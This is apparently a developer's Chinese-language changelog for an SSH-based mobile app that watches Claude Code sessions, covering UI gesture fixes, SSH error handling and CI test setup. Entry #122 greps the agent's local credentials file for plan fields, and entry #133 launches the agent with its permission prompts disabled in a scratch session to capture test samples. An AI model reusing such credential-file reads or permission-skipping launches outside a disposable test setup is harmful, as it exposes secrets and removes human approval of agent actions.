**顺带删掉**的死代码：`SendSheet`（回复弹层）、`sendTo` 状态、卡片的 `onSend`/`onTerminal`。
头部副标题从「点读对话 · 长按发消息」改成「点一下进对话」。

## 122. ⭐ 订阅档位（Max 5x/20x/Pro）读得出来 —— 在 credentials 里，不在 /usage

**需求**：用户看到 Moshi 的用量卡显示「Max 5x · Claude Code」，问档位读不读得到、
ChatGPT/Codex 能不能分开。

**Claude 档位：读得到，但不在 /usage**。`claude -p "/usage"` 只说「using your subscription」，
不给档位。档位在 `~/.claude/.credentials.json`：
```
"subscriptionType":"max"
"rateLimitTier":"default_claude_max_20x"
```
`default_claude_max_20x` → `Max 20x`，`_5x` → `Max 5x`，含 `pro` → `Pro`，
兜底用 `subscriptionType`。fetch 时顺手 grep 这两个字段跟 /usage 拼一起解析。

⚠️ **只 grep 那两个字段，绝不整个 `cat` credentials** —— 那文件里还有
access/refresh token，不能出现在任何日志、抓屏、缓存里。

**ChatGPT/Codex：只能读这台机器上装了的**。Moshi 那张图有 Codex 是因为那台 Mac 装了 codex。
本机 `command -v codex` 没有。真要支持，得等某台服务器上真有 codex CLI、
且先看清它的用量输出长什么样再接（教训：别 ship 没验过的格式）。所以现在只做 Claude 这一路。

## 123. Cloudflare 令牌：能读 zone ≠ 能改 DNS

**用户问**：这个 CF 令牌能用吗（想加 `dl.keuury.com`）。

**实测三步**：
- `tokens/verify` → success（令牌有效，而且**IP 封锁没了**，从本机能过了）
- `zones?name=keuury.com` → success（能**列** zone）
- `POST dns_records` → `9109 Valid user-level authentication not found`（**不能改 DNS**）

这是那个 **R2 存储令牌**：范围是 R2 + Zone:Read，**没有 Zone:DNS:Edit**。
「能验证、能列 zone」很容易让人以为能改 DNS —— 不是。加 A 记录要的是
**Zone → DNS → Edit** 权限的令牌，或者直接在 CF 面板手加一条。

**判据**：CF 令牌能不能干某件事，别看 verify，**直接拿那个具体的写操作试**。
verify 只说令牌活着，不说它有你要的那条权限。

## 124. ⭐ 长按松手误开对话 —— `clickable` 不认长按，照样在抬手时点一下（订正 #121）

**症状**：#121 上线后用户报「长按既不能发消息又不能排列了」。实测：
**长按拎起来、还没拖就松手 → 对话被打开了**（`dumpsys` 抓到 MainActivity 里
进了 ChatScreen）。#121 里那句「轻点漏给 clickable、长按被 `detectDragGesturesAfterLongPress`
接管，两者天然不打架」**是错的**。

**根因**：同一个元素上叠了 `clickable` 和 `detectDragGesturesAfterLongPress` 两套手势。
`clickable` **不知道「长按」这回事** —— 它只看「按下→抬起、中间没滑出 touch slop」。
长按之后**原地松手**（没拖动）正好满足这条件，于是 `onClick`（= 开对话）照发。
`detectDragGesturesAfterLongPress` 的 `onDragStart/onDragEnd` 只管**拖**，
不拦这一次点击。→ 长按不拖 = 误开对话。

**修法**：拖动一起来就**禁掉** `clickable`。给 `SessionCard` 加 `openEnabled: Boolean = true`，
`.clickable(enabled = openEnabled, onClick = onOpen)`；`ReorderablePinned` 里
`openEnabled = dragIndex < 0` —— 任一张卡被拎起（`dragIndex >= 0`）就把整组的轻点关掉。
`onDragStart` 里先 `dragIndex = i`，重组后 `openEnabled` 变 false，`clickable` 在
`enabled` 翻假时会**取消**尚未 fire 的那次点击 → 松手不再误开。拖完
`onDragEnd/onDragCancel` 把 `dragIndex` 归 -1，轻点恢复。

**实测三态齐全（0.8.7 / code 41）**：
- 轻点 → 进对话 ✓（`dragIndex<0` → `openEnabled=true`）
- 长按+拖 → 排序（`pinned_ordered` prefs 顺序翻转）✓
- 长按+松手（不拖）→ **不开对话**（dumpsys 停在主界面）✓

**教训**：Compose 里 `clickable` + 长按手势叠加，**默认会在长按松手时误触发点击**。
想「长按干别的、轻点还要能用」，就得在长按态显式 `enabled=false` 掐掉 clickable，
别指望它自己认长按。#121 那句「天然不打架」是没测「长按不拖就松手」这一路想当然了。

## 125. ⭐ 有时闪退 —— SSH 操作在连接半路死掉时抛未捕获异常

**症状**：用户报「有时候会闪退」。dropbox（`dumpsys dropbox`）里两条崩溃，都在 SSH 层：
- `java.io.IOException: Broken pipe` @ `SshSession$Shell$write`（0.1.0，**早已修**：write 现在 runCatching 返回 false）
- `com.jcraft.jsch.JSchException: session is down` @ `SshSession$exec`（0.8.1，**没修**）

**根因**：手机上连接**半路死掉是常态**——锁屏、切基站、进电梯、服务器掐空闲连接。
死了之后，重连看门狗（[rememberHostSession]）要等 jsch 的心跳判死才动，
而心跳 15 秒 × 2 = **最长 30 秒**才发现。这 30 秒窗口里，任何一个协程往这条死连接上
`exec` / `openExecStream`，jsch 立刻抛 `session is down` / `Broken pipe`。
**这异常从协程里逸出，没人接 = 整个 app 闪退**。

`exec` 有 **30+ 个调用点**，`openExecStream` 在对话界面跟转录流。逐个调用点加 try
必漏；而且看板轮询（每 5 秒一次）**背景一直在 exec**，是撞上死连接概率最高的那个。

**修法（在源头兜，别指望每个调用点）**：
- `SshSession.exec`：整段包 try —— **取消照抛**（`CancellationException`，结构化并发要它），
  连接类失败**吞掉返回空串**，交给看门狗重连。跟 `Shell.write` 一个路子（失败返回 false 不抛）。
  这一处覆盖了全部 30+ 个 exec 调用点。
- `ChatScreen` 的 `TranscriptStream.stream(...).collect`：这条是**裸 collect 在 LaunchedEffect 里**，
  `openExecStream` 抛出来直接逸出 → 看聊天时连接抖一下就崩。用 `app.yxi.ssh.catching { }` 包住。

**为什么不用全局 `CoroutineExceptionHandler` / `setDefaultUncaughtExceptionHandler`**：
那个会把**所有**未捕获异常一起吞（包括真 bug），还得判断哪些该吞哪些该崩，容易把真崩溃藏掉。
在 SSH 源头兜住「连接死了」这一类，精准、不误伤。

**判据**：`catching`（rethrow 取消）vs `runCatching`（吞取消）—— 凡是失败要么显示要么恢复的地方，
用 `catching`；纯粹「失败就当没有」的返回值型（exec→""、write→false）直接吞。**永远单独放过取消**。

**别的 SSH 通道操作**已经安全：`openSftp`（所有调用点 runCatching）、`openShell`（Workspace 外层 runCatching）、
`openExecStream` 在 EventService（watch 里 runCatching + onFailure）。审计过一圈，只有上面两处是裸的。

## 126. 实验室的 WebView demo：动画/复杂背景层不合成，画不出来

**症状**：实验室「网页效果」第一版用 `<canvas>`+`requestAnimationFrame` 画弹球 —— **全黑**。
第二版换成 CSS `body{background:linear-gradient(...);background-size:400% 400%;animation}`（流动渐变）——
**背景还是黑的**，但同一页里的按钮、圆球（元素纯色底）照常显示。

**根因**：`loadDataWithBaseURL(null, …)` 起来的 WebView，对**需要单独合成层**的东西画不出来：
- `<canvas>`：初始 `innerWidth/innerHeight` 常常是 0（WebView 还没 layout），画布 0×0，`onresize` 也不一定补得上。
- **body 的动画/大尺寸渐变背景**（`background-size:400% 400%` + `@keyframes background-position`）：不合成，透明。

但**稳画得出**的是：纯色背景（`body{background:#12152e}`）、元素纯色底（`.ball{background:#f00}`）、
`transform` 动画（旋转/位移/缩放）。文件预览里那张纯色+静态卡片的 html 也正是这些，所以没事。

**修法**：demo 只用「保证会画」的原语搭 —— **纯色底 + 元素纯色 + transform 动画**。
弹球改成三个纯色圆 `transform:rotate() translateX()` 绕圈，背景给纯深色，JS 只留一个计数按钮证明 JS 开着。

**判据**：要在这个 WebView 里做视觉效果，**别碰 canvas 和动画背景层**；用 SVG/纯色元素 + CSS transform。
真要 canvas，得等 layout 完再设尺寸（`ResizeObserver` 或 post 一帧再 `fit()`），单靠 `onload` 不够。

## 127. 更新下载切进会话就停 —— 下载挂在界面 scope + 界面的 SFTP 通道上

**症状**（用户报）：点「下载并安装」开始下更新，**切进任意会话再退出来，下载就停了**，永远装不上。

**根因**：两条都绑在会死的东西上。旧的 `UpdateBanner` 里下载跑在自己的 `rememberCoroutineScope`，
用的又是 `SessionsScreen` 持有、`onDispose` 会关的那条 SFTP 通道。一进会话 `work != null` →
看板 composable 销毁 → **协程被取消 + SFTP 通道被关**，下载静悄悄断掉，连个报错都没有。

**修法**：下载搬进单例 `object UpdateDownloader`，挂在**永不取消**的 app 级
`CoroutineScope(SupervisorJob() + Dispatchers.Main)`；状态（`phase/progress/message`）用 `mutableStateOf`
放单例里，横幅只当「显示器」读它画进度。通道**自己从常驻 ssh 现开一条**（`shared.session.openSftp()`，
finally 关），不碰界面那条 —— `shared` 是 `rememberHostSession` 在 MainActivity **导航切换之上**持有的，
进会话不销毁。回到看板时 `LaunchedEffect(ssh)` 重跑 `Update.check` 把横幅摆回来，`mine` 命中就接着显示实时进度。

**判据**：**任何得活过导航的长任务**（下载/上传/长命令）—— 放 app 级或单例 scope，通道从「跟主机活、不跟界面活」
的那条连接现开，别用界面的 `rememberCoroutineScope`，也别用界面 `onDispose` 会关的通道。发布 code 53 / 0.9.9。

## 128. 一批小巧思（0.9.11）踩到的三个平台坑

**① 通知上的 RemoteInput「回一句」不回填 —— PendingIntent 用了 IMMUTABLE。**
症状：点通知的回复框、打字、发送，`RemoteInput.getResultsFromIntent()` 拿到 null。
根因：回复动作的 `PendingIntent` 必须是 **`FLAG_MUTABLE`**，系统才能把用户输入塞进那个 Intent；
用 `FLAG_IMMUTABLE`（其它通知动作的标配）就永远取不到回复。
修：`replyAction()` 里的 PendingIntent 用 `FLAG_MUTABLE`（唯独这个动作，别的照旧 IMMUTABLE）。

**② 改了通知频道的震动/重要级，不生效。**
根因：`NotificationChannel` 一旦创建，之后改 `vibrationPattern`/importance **系统一律忽略**（只有用户能在设置里改）。
修：要新行为就**换新频道 id**。所以「触感词汇表」拆成 `yxi.needs`/`yxi.done` 两个新频道，
并 `deleteNotificationChannel("yxi.events")` 把老的合并频道退休。

**③ 想在通知按钮上验指纹 —— 做不到。**
根因：通知动作走**广播**（`BroadcastReceiver`，无 Activity），而 `BiometricPrompt` 需要一个前台 Activity 才能弹。
所以「危险审批先验指纹」只做在**应用内**的审批卡（`ChatScreen` 的 `PendingCard.onPick`，那儿有 Activity）；
通知上的一键批准维持原状。要在通知上也验，得起一个透明 trampoline Activity 弹 BiometricPrompt 再广播 —— 本次没做。

**另**：磁贴/桌面小组件没有 SSH 连接，只能读 `EventService` 写进 `SharedPreferences("yxi")` 的
`waitingCount/workingCount/waitingNames`（服务每次 `refreshOngoing` 写一版并 poke 它们）。`ShareActivity` 则借
`EventService.liveConn()` 已建好的连接，省一次握手（借来的连接用完**不能**关，只关自己新建的）。

## 129. 按下/长按时高亮是个方块，不跟按钮形状（水波纹没被裁）

**症状**（用户报）：长按界面上各种可点的东西，变色的**不是那个按钮本身**，而是一个方方正正的长方形块。

**根因**：Compose 里**水波纹只会被它前面的 `clip` 裁**。写法是
```kotlin
Surface(shape = Pill, modifier = Modifier.clickable { … })   // ❌
```
`Surface` 自己确实按 `shape` 裁了**它的内容**，但 `clickable` 挂在**它外面的 modifier 上** ——
波纹画在这个节点的**矩形边界**里，于是胶囊按钮按下去是个长方形。全 App **48 处**都是这么写的。

**修法**：在 `clickable` **紧前面**加 `.clip(那个 shape)`：
```kotlin
Surface(shape = Pill, modifier = Modifier.clip(Pill).clickable { … })   // ✓
```

⚠️ **位置必须紧挨着 `clickable`，不能甩到链首。** 链里若有 `.padding()`，
`Modifier.clip(X).padding(…).clickable{}` 的波纹取的是**padding 之后那个更小的矩形**，照样是方块。
正确是 `Modifier.padding(…).clip(X).clickable{}` —— 第一版脚本就是插到链首，等于没修，
是复查 `ConfigScreen` 那个带 `padding(start=12.dp)` 的行时发现的。

**怎么验**（肉眼看不准，波纹很淡）：`adb shell input motionevent DOWN x y` **按住不放**，
截图，再 `UP`；跟静止那张做**像素 diff**，看变化区域的**四角有没有被涂到** ——
四角没变、边中点变了 = 跟着圆角走。⚠️ 单看「四角没变」会被**没裁的圆形波纹**骗过去
（圆形本来也不碰四角），还要比对变化区域是否超出按钮边界。

## 130. 会话卡的「上次活动」时间严重不准（tmux 和 cc-state 两个信号都会陈旧）

**症状**（用户报）：看板上写着「14 小时前 / 1 天前」，可那些会话**刚刚还在聊**。

**根因**：`lastActivity` 原来只取 `tmux list-sessions` 的 `#{session_activity}`。实测同一时刻：

| 会话 | tmux 活动 | cc-state 的 ts | **转录 mtime（真相）** |
|---|---|---|---|
| claude_desktop | 2 天前 | **7 天前** | **1 分钟前** |
| mail | 1 天前 | 3 分钟前 | **5 分钟前** |
| nanobanana | 1 天前 | 1 天前 | **4 分钟前** |
| Yxi | 0 分钟前 | 0 分钟前 | 0 分钟前 |

`session_activity` 不随「没人 attach 时的输出」可靠更新；`cc-state` 的 ts 要靠钩子写，更容易过期。
**只有转录文件的 mtime 是权威** —— Claude Code 每说一句都在写它。

**修法**：抓取脚本多一段，列出 `~/.claude/projects/<项目目录>` → 最新 `.jsonl` 的 mtime；
`lastActivityOf()` 取 `max(tmux 活动, 转录 mtime)`，转录读不到就退回 tmux（不会显示成 1970）。

⚠️ **别用「每个目录 ls + stat」的写法**：实测 230ms，而看板每 5 秒抓一次。
`find ... -printf '%h\t%T@\n' | awk` 一次扫完只要 **8ms**（快 29 倍）。
`-printf` 是 GNU find 专有，不是 GNU find 就输出空 → 自动退回 tmux 的时间，优雅降级。

⚠️ **顺带记一笔**：`state`（等你/干活中）也来自 cc-state，同样可能陈旧 —— 这次没动它，
但看板分组理论上也会跟着旧。哪天发现「分组不对」，先怀疑这个。

## 131. 点了发送再切走，消息丢了（协程跟着界面被取消）

**症状**（用户报）：对话里点向上的提交箭头，**马上切出去，那句话就没发给 agent**；
「要在对话里面等几秒再返回才算发出去」。

**根因两层**，都得修：

1. 发送跑在对话界面的 `rememberCoroutineScope()` 上 —— **界面一销毁协程就被取消**。
   而草稿在点击那一刻就已经清空**并落盘**了（防「退出去草稿复活」），
   于是那句话**既没发出去、又从输入框消失了**。
2. `SessionProbe.send()` 是**两步**：先 `send-keys -l <文本>`、再 `send-keys Enter`
   （合成一条的话文本里的 `Enter` 三个字会被当按键名）。
   中间被取消 = **字打进去了但回车没送**，那句话卡在对方输入框里没提交 —— 看起来更像「发了没反应」。

**修法**：
- `SessionProbe.send()` 整段包 `withContext(NonCancellable)` —— 打字和回车不可能被劈开
- 新增 `ui/Sender.kt`：挂 app 级 `SupervisorJob` scope（跟 `UpdateDownloader` 同一个套路），
  界面销毁也照发；**发失败就把话还回草稿**并提示，绝不让它凭空没了

**判据（通用）**：**任何「点一下就走」的动作**（发消息、上传、装公钥、下载）
都不能挂在界面的 `rememberCoroutineScope` 上 —— 用户点完立刻切走是最自然的操作。

**怎么验**：开个临时 tmux 会话当靶子 → App 里输入一个无空格标记 → 点发送 → **立刻按返回（零等待）**
→ `tmux capture-pane -pt <会话> | grep <标记>`。命中且**被执行过**（command not found）才算通过，
只看到文字没被执行 = 回车丢了。⚠️ 别拿真在干活的会话当靶子。

## 132. App 更新从「所连服务器的 SFTP」改成「公网下载页」

**起因**（用户问的）：「版本是 ssh 推给我的吗？那换一个客户不就搞不了了」。
澄清：**从来不是推**，是手机自己去**拉**。但旧做法拉的是**所连服务器**上的 `~/.yxi/latest.json`，
所以换个客户 → 他自己的服务器上没有包 → **App 内更新对他失效**（只能回下载页手动装）。

**改法**：公网优先、服务器回落。踩到三件事：

**① 明文 HTTP 会被 Android 静默拦掉。**
下载站原来是 `http://64.90.25.56:8899`，而 targetSdk 28+ 默认禁明文 —— 请求直接失败，**不报错、不提示**。
中间方案是 `network_security_config.xml` **只给那一个域名**开明文（不是全 App 放开）。
后来上了 HTTPS，这个豁免**整个删掉**了 —— 有 HTTPS 就别留明文口子。

**② 上 HTTPS 的正确顺序**（域名在 Cloudflare）：
先加 A 记录 **灰云（DNS only）** → 在源站 `certbot --nginx -d dl.keuury.com` 拿真证书 → 之后想开橙云再开。
⚠️ **别一上来就橙云**：CF 回源时源站没证书，只能把整个域的 SSL 模式降成 Flexible，
会把同域下**别的站一起变弱**。另外 CF 代理**不支持 8899 端口**（只支持 80/8080/2052… 那几个），
所以域名走的是 nginx 里 `listen 80` 那个 server 块 —— 幸好早就写好了，加条 DNS 就活。

**③ 最容易漏的：检查更新别挂在 ssh 上。**
第一版写成 `LaunchedEffect(ssh) { val s = ssh ?: return@LaunchedEffect; checkPublic() }` ——
公网检查明明不需要连接，却被连接门槛挡住了，**没连主机就永远查不到更新**，
而「换个客户也能更新」正是做这件事的理由。拆成两个 effect：公网那条用 `LaunchedEffect(Unit)`。

**怎么验（关键）**：把服务器上的 `~/.yxi/latest.json` **临时藏起来**、并且**不配任何主机**，
这时 App 里还能查到新版本 → 只可能来自公网。实测：查到 0.9.24、下载 33846290 字节
（与公网 Content-Length 一字节不差）、系统安装器被拉起。

⚠️ **老链接 `http://64.90.25.56:8899/<token>/` 必须保留** —— 已装旧版的人还靠它更新。

## 133. 选择器：问题正文丢失 / 切题要等十秒 / 回不到上一题

**症状**（用户报，带截图）：①「只有选择没有问题」——卡片上只有选项，问题正文不见了；
末尾多出两项，最后一项的说明写着 `Enter to select · Tab/Arrow keys to`。
② 点一个选项要**等约十秒**才到下一题。③ 多个问题时**回不去上一题改选择**。

**① 脚注换行 → 被当成最后一项的说明。**
窄屏（**手机开过「终端」后 tmux 会话会被缩到手机宽度**）上，脚注断成两行：
```
Enter to select · Tab/Arrow keys to navigate ·
Esc to cancel
```
`indexOfLast(isFooter)` 取到的是**第二行**，于是第一行落在选项块里 → 变成最后一项的说明。
修：新增 `isFooterish()`，说明行里排除脚注碎片。

**② 问题正文要按「段」收，不能只取一行。**
长问题在窄屏会折行，只取「1 号选项上面第一行非噪声」= 只拿到最后半句。
修：往上连续收集，遇到空行/分隔线/标签栏才停，再拼起来。

**③ 十秒延迟的真正原因不是网络，是逻辑。**
老写法：送键 → `delay(500)` → **抓一次**。TUI 常常还没重绘完，抓到的是旧屏；
而这段时间轮询被 `busy` 停着，于是要等它恢复后的下一轮（**闲时 2.5 秒**）、
甚至再下一轮才看得到新题。
修：`awaitChange()` —— 短间隔连抓直到**指纹变了**就返回（130ms × 最多 20 次），
每抓一次先喂给界面；同时「有待答面板挂着」时轮询间隔 2.5s → 0.7s。
实测切题从 ~10 秒降到 **~3 秒**（余下的基本是 SSH 往返，本地抓屏本身是 0ms）。

**④ 回上一题是 TUI 本来就支持的**，脚注写着 `Tab/Arrow keys to navigate`：
顶上那条 `←  ☐ 名字  ☒ 配色  ✔ Submit  →` 就是问题标签栏，**←/→ 在问题间走**，
`☒` = 已答、`☐` = 未答。已把标签栏解析出来（`Pending.tabs`）并在卡片上给了「← 上一题 / 下一题 →」。

**⑤ 提交别硬编码「Right 一次就是 Submit 页」**——那只在停在最后一题时成立。
改成：一路 `Right`，每次等屏幕变，直到解析出 `review`（`Review your answers`）页，再选 `Submit answers`。

**怎么造样本**（以后再动这块解析，照这个来，别靠猜）：
```bash
tmux new-session -d -s cc-asktest -c /tmp/asktest
tmux send-keys -t cc-asktest 'IS_SANDBOX=1 claude --dangerously-skip-permissions' Enter
# 让它用 AskUserQuestion 出两个问题、第二个 multiSelect
tmux resize-window -t cc-asktest -x 46 -y 30     # ← 复现窄屏换行的关键
tmux capture-pane -pt cc-asktest > sample.txt
```
真实样本已固化进 `PromptRealTest`（单选/多选/窄屏/复核页四种）。⚠️ 用完 `tmux kill-session`。

## 134. 选择器延迟的根治：从「每次去问」改成「变了才推」

**接 #133。** #133 把切题从 ~10 秒压到 ~3 秒，但那只是把轮询调快，**没治本**。

**本因**：抓屏这件事本身是 **0 毫秒**（本地 `tmux capture-pane` 实测 0.00s），
延迟几乎全在「每问一次就要一个 SSH 往返」+ 轮询间隔。轮询再快也是在**反复问**。

**根治**：`SessionProbe.watchScreen()` —— 一条长连通道，**变化检测放在服务器侧**：
```sh
trap 'exit' PIPE HUP TERM INT; prev=''
while :; do
  cur=$(tmux capture-pane -pt '<会话>' -S -60) || exit
  [ "$cur" != "$prev" ] && { printf '%s\n__YXI_SCR__\n' "$cur" || exit; prev=$cur; }
  sleep 0.2
done
```
没变就**一个字节都不过网**。实测：静止时零推送；屏幕一变 **206ms** 到本地。
送键后不再自己抓屏，等推流把新屏送来即可（`waitScreenChange` 只读本地状态，零往返）。

⚠️ **`|| exit` 不能省** —— 会话没了/手机断了要让远端循环自己退，否则每次重连都留一个空转的壳
（跟 [SshSession.follow] 同一个坑）。

**踩到两个真坑：**

**① flow 体默认跑在收集方线程上 → ANR。**
`readLine()` 是阻塞调用，而收集方是 Compose 的 `LaunchedEffect`（**主线程**），
于是界面直接卡死弹「Yxi isn't responding」。必须 `.flowOn(Dispatchers.IO)`
（`TranscriptStream` 早就这么写了，我照抄时漏了）。

**② 解析也不能放主线程。**
它忙起来时屏幕每 0.2 秒变一次，主线程就一直在解析 + 重组。
改成**在 IO 上解析完**再把 `Pending?/Live` 交给界面，并 `.conflate()`
（主线程没跟上就丢中间帧，只取最新的 —— 排队只会越积越卡）。

**⚠️ 量延迟别用 uiautomator**：实测一次 `uiautomator dump` 要 **2.4–2.8 秒**，
比被测对象慢一个数量级，量出来全是它自己的开销（我第一次量成 3 秒就是这么来的）。
要量就**分段量**：TUI 重绘 100ms（服务器侧 tmux 自比对）、推送到达 206ms（本地跑那段脚本计时）。

**代价**：聊天开着且对方在干活时，状态行每秒都在变 → 大约每秒一次、每次 ~4KB 的推送。
换来的是「点一下就动」。不开聊天不产生流量。

## #135 iOS 模拟器里钥匙串全挂：`keychain(-34018)`，根因是 CI 把签名整个关了

**症状**　CI 里让 App 把自己的 SSH 公钥吐出来做端到端测试，拿回来的是
`ERROR: keychain(-34018)`。`-34018` = `errSecMissingEntitlement`。
表现上像是「模拟器不支持钥匙串」，实际不是。

**根因**　为了在没有开发者账号的 runner 上编过，构建参数里写了
`CODE_SIGNING_ALLOWED=NO`。这一关，App 就**完全没有签名、也没有
`application-identifier` 这类 entitlement**，而钥匙串的每一次访问都要靠它
划分归属 —— 于是 `SecItemAdd` / `SecItemCopyMatching` 一律 -34018。

顺带说明一件更要紧的事：**Yxi 的凭据层整个建在钥匙串上**
（`Vault` 存密码、`KeyManager` 存私钥）。签名一关，等于把认证层整个废掉，
只是它不报「没签名」而报「钥匙串错误」，很容易被当成模拟器的毛病。

**修法**　模拟器构建**不需要真证书，但需要签名**。把那一行换成 ad-hoc：

```
CODE_SIGNING_ALLOWED=YES CODE_SIGNING_REQUIRED=NO CODE_SIGN_IDENTITY=-
```

`-` 就是 ad-hoc 身份，不用开发者账号，也不用 team id，同时 Xcode 会
生成基本的 entitlements —— 钥匙串就正常了。

**怎么避开**　凡是「关掉签名让它编过」的构建参数，都要记一笔它顺带关掉了什么。
签名不只是签名，它带着一整套 entitlement；钥匙串、钥匙串共享、推送、
App Group 都挂在上面。

## #136 清 ANSI 的正则写成 raw string，ICU 把整个模型名吃光

**症状**　顶栏该显示「切到了哪个模型」。`/model` 的回执解析出来是**空串**，
于是顶栏永远显示上一条 assistant 消息里的旧模型名 —— 看起来像「切模型没生效」。

**根因**　回执长这样（真样本，`ESC` 是真的转义字符）：

```
<local-command-stdout>Set model to <ESC>[1mOpus 4.6 (1M context)<ESC>[22m and saved …
```

要把 `<ESC>[1m` 这类 ANSI 去掉。原来写的是

```swift
raw.replacingOccurrences(of: #"\u{1B}?\[[0-9;]*m"#, with: "", options: .regularExpression)
```

`#"…"#` 是 **raw string**，Swift 不做转义，于是 ICU 拿到的是字面量 `\u{1B}` ——
它按**自己**的语法去解释这一串，结果匹配到了整个字符串，替换后剩下空串。
不报错，只是安静地把内容清空。

**修法**　别用 raw string，让 Swift 先把 ESC 插进去，正则里只留 `\[[0-9;]*m`：

```swift
raw.replacingOccurrences(of: "\u{1B}?\\[[0-9;]*m", with: "", options: .regularExpression)
```

**怎么避开**　正则里出现 `\u`、`\x`、`\N` 这类**转义字符字面量**时，
先想清楚是让 **Swift** 转义还是让**正则引擎**转义 —— raw string 会把这个决定
默默交给引擎。另：这条是靠「用真回执做测试样本」照出来的，自己编一个
`Set model to Opus 5` 的干净字符串永远碰不到（没有 ANSI）。

## #137 端到端连不上：「主机指纹变了，已拒绝连接」—— 服务器给的不是我们钉的那把

**症状**　CI 里让模拟器连 runner 上现起的 sshd，App 弹
「`runner@127.0.0.1` 的主机指纹变了，已拒绝连接」。端口是通的
（`nc -z` 成功），公钥也装进 `authorized_keys` 了。

**根因**　macOS 的 sshd **默认同时提供 ed25519 / ecdsa / rsa 三把主机密钥**，
最终用哪一把由客户端和服务端协商决定。CI 里只把 **ed25519** 那把的指纹
提前塞进了 App（为了跳过首次连接的信任弹窗），而实际协商出来的是另一把 ——
于是 App 认为指纹对不上。

⚠️ **这是 App 该有的行为，不是 bug。** 指纹对不上就拒连，正是中间人防护。
错的是测试环境：钉了一把，却让服务器随便给。

**修法**　让服务器只提供那一把。OpenSSH 里只要显式写过 `HostKey`，
默认的几把就不再启用：

```bash
echo "HostKey /etc/ssh/ssh_host_ed25519_key" | sudo tee -a /etc/ssh/sshd_config
sudo launchctl kickstart -k system/com.openssh.sshd
ssh-keyscan -p 22 127.0.0.1        # 核一遍到底提供了哪几把
```

**顺带一个假警报**　同一轮里「本机自测 ssh 没通」是测试自己写错了：
`ssh $(whoami)@127.0.0.1` 用的是 **runner 自己的**密钥，而
`authorized_keys` 里装的是 **App 的**公钥。自测要另生成一把专用密钥。

**怎么避开**　凡是「提前钉指纹」的自动化，都要同时**把服务器锁到那一把**，
并在日志里 `ssh-keyscan` 打出实际提供的算法 —— 否则失败信息只会说
「指纹变了」，看不出是环境给错了。

## #138 端到端还是「指纹变了」：带空格的参数被 shell 词分割掉了一半

**症状**　#137 把 sshd 锁到 ed25519 之后（`ssh-keyscan` 确认只提供这一把），
App 仍然报「`runner@127.0.0.1` 的主机指纹变了，已拒绝连接」。

**根因**　主机公钥是 `ssh-ed25519 AAAAC3Nza…`，**中间有一个空格**。CI 里写的是

```bash
SEED="-yxiSeedHost 127.0.0.1:22 -yxiSeedUser runner -yxiSeedHostKey $HOSTKEY"
xcrun simctl launch "$UDID" app.yxi --args $SEED       # ← 未加引号，词分割
```

于是 App 实际收到的 `-yxiSeedHostKey` 值只有 `ssh-ed25519`，后面那段 base64
变成了一个游离参数。`NIOSSHPublicKey(openSSHPublicKey:)` 解不出来 ——
而 `KnownHosts.decide` 对「存过东西但解不出来」的处理是**宁可拒，不降级成
第一次见**（#49 的 fail-closed）。所以 App 的行为完全正确，错的是测试脚本。

**修法**　用数组，别用字符串拼参数：

```bash
SEED=( -yxiSeedHost 127.0.0.1:22 -yxiSeedUser "$(whoami)" -yxiSeedHostKey "$HOSTKEY" )
xcrun simctl launch "$UDID" app.yxi --args "${SEED[@]}"
```

**怎么避开**　凡是**值里可能有空格**的参数（公钥、路径、人名、中文句子），
在 shell 里就只能用数组传，不能拼字符串。
这个坑的欺骗性在于：**它长得像功能有 bug**，实际是测试环境喂错了数据 ——
连续两轮都被同一句红字误导。查的时候要先问「App 收到的到底是什么」。

**另一个同批的**　macOS 的 `/Users/<user>` 常常是组可写的，sshd 的
`StrictModes yes` 会因此**静默拒绝**公钥认证（只有 sshd 日志里有原因，
客户端只看到 Permission denied）。CI 是一次性机器，`StrictModes no` 即可。

## #139 macOS 上别用系统那台 sshd 做自动化测试，自己起一台

**症状**　CI 里 `systemsetup -setremotelogin on` 开了远程登录，端口通、
公钥装进了 `~/.ssh/authorized_keys`、`ssh-keyscan` 也确认主机密钥对，
但认证一律 `Permission denied (publickey,password,keyboard-interactive)`。
`ssh -v` 显示公钥**送出去了**，服务器直接拒绝，客户端这边看不出原因。

**根因**（两条，叠在一起）
1. macOS 把「谁能 SSH 登录」单独关在 **`com.apple.access_ssh`** 这个组里
   （SACL）。开了远程登录不等于某个账号被放行。
2. 系统的 `/etc/ssh/sshd_config` 里在先的设置**压过**我们追加在末尾的 ——
   OpenSSH 多数关键字是**先到先得**，往文件尾部 `tee -a` 常常没用。

而 sshd 拒绝的真实原因只写在系统日志里（`log show --predicate 'process=="sshd"'`），
在 CI 上很难捞。

**修法**　**别碰系统那台**，自己起一台，端口、主机密钥、配置全自己给：

```bash
ssh-keygen -q -t ed25519 -N "" -f ~/ci_hostkey
cat > ~/sshd_ci.conf <<CONF
Port 2222
ListenAddress 127.0.0.1
HostKey $HOME/ci_hostkey
PidFile $HOME/sshd_ci.pid
AuthorizedKeysFile $HOME/.ssh/authorized_keys
PubkeyAuthentication yes
StrictModes no          # 家目录常是组可写的，yes 会静默拒绝
UsePAM no
Subsystem sftp /usr/libexec/sftp-server   # 文件模式的命脉，必须显式开
CONF
sudo /usr/sbin/sshd -f ~/sshd_ci.conf
```

**怎么避开**　在别人的机器（CI runner、别人的服务器）上做 SSH 自动化，
**起一台自己的**永远比改系统那台省事：配置可控、日志可读、不影响宿主、
用完随机器一起消失。改系统 sshd 的每一步都可能被某条你看不见的策略推翻。

## #140 公钥「装进去了」却还是 Permission denied —— 两把钥匙被粘成了一行

**症状**　CI 里把 App 的公钥追加进 runner 的 `authorized_keys`，权限、属主、
主机指纹全部核对无误（`ssh-keyscan` 扫到的跟自己生成的一模一样），
sshd 日志也走到 `trying public key file /Users/.../authorized_keys`，
然后认证仍然被拒。

**根因**　`KeyIdentity.authorizedKeysLine` 生成的字符串**末尾没有换行符**
（`"<key> <comment>"`，就这样）。于是

```bash
cat app.pub       >> ~/.ssh/authorized_keys
cat ci_probe.pub  >> ~/.ssh/authorized_keys
```

产出的是**一行**：`ssh-ed25519 AAAA…app-keyssh-ed25519 AAAA…ci-key`。
sshd 读到一行畸形数据，**两把钥匙一把都匹配不上**。
本机可复现：上面那两条 `cat` 之后 `grep -c "^ssh-"` 只有 1，不是 2。

**修法**　追加时自己补换行，并且**核一遍每行都是完整的钥匙**：

```bash
{ cat "$PUB"; echo; } >> ~/.ssh/authorized_keys
awk '{ if (NF < 2 || $1 !~ /^ssh-/) print "❌ 第 " NR " 行不是合法钥匙行" }' ~/.ssh/authorized_keys
```

